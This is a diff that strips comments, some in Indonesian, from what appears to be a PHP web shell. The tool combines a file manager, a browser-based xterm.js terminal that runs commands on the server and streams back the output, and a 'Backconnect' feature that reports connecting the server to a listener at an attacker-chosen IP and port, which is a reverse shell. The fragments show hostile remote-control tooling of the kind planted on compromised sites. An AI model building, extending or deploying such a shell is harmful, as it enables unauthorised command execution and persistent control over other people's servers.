@@ -726,9 +726,6 @@ function list_files($dir)
 
     send_success($response_data);
 }
-// Fungsi-fungsi pembantu lainnya (create_directory, delete_item_recursive, dll.)
-// sebagian besar sudah baik dan tidak memerlukan perubahan signifikan.
-// Namun, saya akan melakukan beberapa penyesuaian kecil pada beberapa fungsi.
 
 function create_directory($path, $name)
 {
@@ -1530,9 +1527,7 @@ function format_size($bytes)
 
         .terminal-container {
             flex-grow: 1;
-            /* Membuat terminal mengisi sisa ruang vertikal */
             min-height: 0;
-            /* Penting agar xterm.js bisa di-resize dengan benar */
         }
 
         .tools-container {
@@ -1541,7 +1536,6 @@ function format_size($bytes)
             border-radius: 6px;
             padding: 1rem;
             flex-shrink: 0;
-            /* Mencegah container tools menyusut */
         }
 
         .tools-container h5 {
@@ -2162,7 +2156,6 @@ function format_size($bytes)
                             }
                         })
                         .fail((xhr, status, error) => {
-                            // A timeout is expected here, so we interpret it as success.
                             if (status === 'timeout' || xhr.statusText === "timeout") {
                                 showSuccess(`Backconnect initiated to ${formValues.ip}:${formValues.port}. The server is now connected to your listener.`);
                             } else {
@@ -2319,7 +2312,6 @@ function format_size($bytes)
 
             let fileToEdit = '';
 
-            // --- FUNGSI DIPERBARUI DENGAN LOADING ANIMATION ---
             function editFile(fileName) {
                 showLoading('Loading File', `Opening <strong>${fileName}</strong>...`);
 
@@ -2681,17 +2673,14 @@ function format_size($bytes)
                         })
                         .then(response => {
                             const contentType = response.headers.get("content-type");
-                            // If it's a 'cd' command, it will be a standard JSON response.
                             if (contentType && contentType.includes("application/json")) {
                                 return response.json().then(data => {
                                     if (data.output) {
-                                        // Replace newlines for proper terminal display
                                         term.write(data.output.replace(/\n/g, '\r\n'));
                                     }
                                     term.write('\r\n' + prompt);
                                 });
                             } else {
-                                // Otherwise, handle it as a real-time stream.
                                 const reader = response.body.getReader();
                                 const decoder = new TextDecoder();
 
@@ -2701,16 +2690,14 @@ function format_size($bytes)
                                         value
                                     }) => {
                                         if (done) {
-                                            // The stream is finished, so we show a new prompt.
                                             term.write('\r\n' + prompt);
                                             return;
                                         }
                                         const chunk = decoder.decode(value, {
                                             stream: true
                                         });
-                                        // Replace newlines for proper terminal display
                                         term.write(chunk.replace(/\n/g, '\r\n'));
-                                        return processStream(); // Continue reading the stream
+                                        return processStream();
                                     });
                                 }
                                 return processStream();
@@ -2718,23 +2705,20 @@ function format_size($bytes)
                         })
                         .catch(error => {
                             console.error('Terminal command failed:', error);
-                            // Write error in red to the terminal
                             term.writeln('\r\n\x1b[31mError: ' + error.message + '\x1b[0m');
                             term.write('\r\n' + prompt);
                         });
                 } else {
                     term.write(prompt);
                 }
-                command = ''; // Reset command buffer for the next command
+                command = '';
             }
-            // Handle Backspace key
             else if (data === '\x7f') {
                 if (command.length > 0) {
-                    term.write('\b \b'); // Move cursor back, write space, move back again
+                    term.write('\b \b'); 
                     command = command.slice(0, -1);
                 }
             }
-            // Handle all other characters (including pasted text)
             else {
                 command += data;
                 term.write(data);
@@ -2744,7 +2728,6 @@ function format_size($bytes)
         term.onKey(({
             domEvent
         }) => {
-            // Shortcut Ctrl + L to clear the screen
             if (domEvent.ctrlKey && domEvent.key.toLowerCase() === 'l') {
                 domEvent.preventDefault();
                 term.clear();
